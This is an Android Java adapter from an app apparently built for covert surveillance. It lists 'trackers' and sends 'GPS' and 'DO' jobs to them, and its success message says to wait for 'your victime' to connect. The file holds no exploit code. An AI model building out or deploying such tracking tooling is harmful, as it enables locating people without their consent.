package dali.survillance.adapter;

import android.app.ProgressDialog;
import android.content.Context;
import android.os.AsyncTask;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;

import dali.survillance.R;
import dali.survillance.controlleur.JobsControlleur;
import dali.survillance.model.Jobs;
import dali.survillance.model.Tracker;

/**
 * Created by Mohamed ali on 25/01/2017.
 */

public class TrackersAdapter extends RecyclerView.Adapter<TrackersAdapter.MyViewHolder> {


    private ArrayList<Tracker> list;
    private Context mContext;
    private ProgressDialog mProgress;
    public TrackersAdapter(ArrayList<Tracker> trackers,Context mContext){
        this.list=trackers;
        this.mContext=mContext;
    }


    @Override
    public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
        View itemView = LayoutInflater.from(parent.getContext())
                .inflate(R.layout.row_trackers, parent, false);

        return new MyViewHolder(itemView);
    }

    @Override
    public void onBindViewHolder(MyViewHolder holder, final int position) {
                    holder.nom.setText(list.get(position).getNom());
                    holder.prenom.setText(list.get(position).getPrenom());
                    holder.track.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View v) {
                            Jobs j=new Jobs();
                            Tracker tracker=new Tracker();
                            tracker.setId(list.get(position).getId());
                            j.setTracker(tracker);
                            String Today = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss").format(Calendar.getInstance().getTime());
                            j.setDate(Today);
                            j.setJobs("GPS");
                            new MakeJobs().execute(j);

                        }
                    });
        holder.do_.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Jobs j=new Jobs();
                Tracker tracker=new Tracker();
                tracker.setId(list.get(position).getId());
                j.setTracker(tracker);
                String Today = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss").format(Calendar.getInstance().getTime());
                j.setDate(Today);
                j.setJobs("DO");
                new MakeJobs().execute(j);
            }
        });
    }



    @Override
    public int getItemCount() {
        return list.size();
    }

    public class MyViewHolder  extends RecyclerView.ViewHolder {

        TextView nom,prenom;
        Button track,do_;

        public MyViewHolder(View itemView) {
            super(itemView);
            nom=(TextView)itemView.findViewById(R.id.id_row_trackers_name);
            prenom=(TextView)itemView.findViewById(R.id.id_row_trackers_prenom);
            track=(Button)itemView.findViewById(R.id.id_row_trackers_position);
            do_=(Button)itemView.findViewById(R.id.id_row_trackers_do);
        }
    }







    public class MakeJobs extends AsyncTask<Jobs,String,Boolean> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            mProgress=new ProgressDialog(mContext);
            mProgress.setMessage("Wait please ...");
            mProgress.setCancelable(false);
            mProgress.show();
        }

        @Override
        protected Boolean doInBackground(Jobs... params) {
            return JobsControlleur.makeJobs(params[0]);
        }

        @Override
        protected void onPostExecute(Boolean aBoolean) {
            super.onPostExecute(aBoolean);
            mProgress.dismiss();
            if (aBoolean){
                Toast.makeText(mContext,"Tracking of position active!wait your victime connect",Toast.LENGTH_LONG).show();
            }else{
                Toast.makeText(mContext,"Impossible to make jobs ",Toast.LENGTH_LONG).show();
            }
        }
    }





}
